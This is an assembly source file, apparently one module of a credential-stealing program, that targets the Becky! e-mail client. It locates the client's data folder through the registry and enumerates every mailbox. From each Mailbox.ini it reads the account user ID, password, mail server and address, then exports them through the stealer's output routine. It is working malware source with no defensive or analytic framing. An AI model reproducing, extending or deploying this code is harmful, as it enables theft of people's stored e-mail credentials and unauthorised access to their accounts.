; Becky! e-mail client
; Tested on:
; 	Becky! v2.09.01

.data
	@AllocStr	<szBeckyPath>,		<"Software\RimArts\B2\Settings">
	@AllocStr	<szBeckyValue>,		<"DataDir">
	@AllocStr	<szBeckyAccount>,	<"\Mailbox.ini">
	@AllocStr	<szBeckyAVal>,		<"Account">
	@AllocStr	<szBeckyMailSrv>,	<"MailServer">
	@AllocStr	<szBeckyUser>,		<"UserID">
	@AllocStr	<szBeckyPass>,		<"PassWd">
	@AllocStr	<szBeckyMail>,		<"MailAddress">		
	@AllocMem	<lpBeckyCommonBuf>,	<MAX_PATH+1>
	@AllocMem	<lpBeckyValueBuf>,	<MAX_PATH+1>

.code

BeckyDumpData proc szVal, dwType: DWORD
	invoke  GetPrivateProfileString, offset szBeckyAVal, szVal, offset szNilStr, offset lpBeckyValueBuf, MAX_PATH, offset lpBeckyCommonBuf
	.IF	eax
		invoke	ExportStr, dwType, 0, offset lpBeckyValueBuf
	.ENDIF  
	ret
BeckyDumpData endp

GetBeckyPass proc
	invoke	BeckyDumpData, offset szBeckyUser, TYPE_BECKY_USER
	invoke	BeckyDumpData, offset szBeckyMail, TYPE_BECKY_EMAIL
	invoke	BeckyDumpData, offset szBeckyMailSrv, TYPE_BECKY_SERVER
	invoke	BeckyDumpData, offset szBeckyPass, TYPE_BECKY_PASS
	ret
GetBeckyPass endp

GetBeckyAccounts proc
	LOCAL   FindFileData: WIN32_FIND_DATA
	LOCAL   hFind: DWORD
	
	invoke	lstrlen, offset lpBeckyCommonBuf
	lea	edi, [eax+offset lpBeckyCommonBuf]
	mov	dword ptr[edi], '*.*'
        
	invoke  FindFirstFile, offset lpBeckyCommonBuf, addr FindFileData
	mov     hFind, eax
	inc     eax
	jz      @ret	
        
@find_loop:                
        cmp	FindFileData.cFileName[0], '.'
        jz	@level_up_skip
        
        invoke  lstrcpy, edi, addr FindFileData.cFileName
        invoke	lstrcat, offset lpBeckyCommonBuf, offset szBeckyAccount
        invoke	GetBeckyPass

@level_up_skip:
	invoke  FindNextFile, hFind, addr FindFileData
	test    eax, eax
	jnz	@find_loop

	invoke  FindClose, hFind
	
@ret:	
	ret
GetBeckyAccounts endp

GetBeckyOutput proc
	LOCAL	dwBufLen: DWORD
	
	; Write header
	invoke	ExportModule, MODULE_BECKY
	
	; Get mail data path
	mov	dwBufLen, MAX_PATH
	invoke	RegReadValue, HKEY_CURRENT_USER, offset szBeckyPath, offset szBeckyValue, offset lpBeckyCommonBuf, addr dwBufLen
	test	eax, eax
	jz	@ret
	
	invoke	GetBeckyAccounts
	 
@ret:	
	ret
GetBeckyOutput endp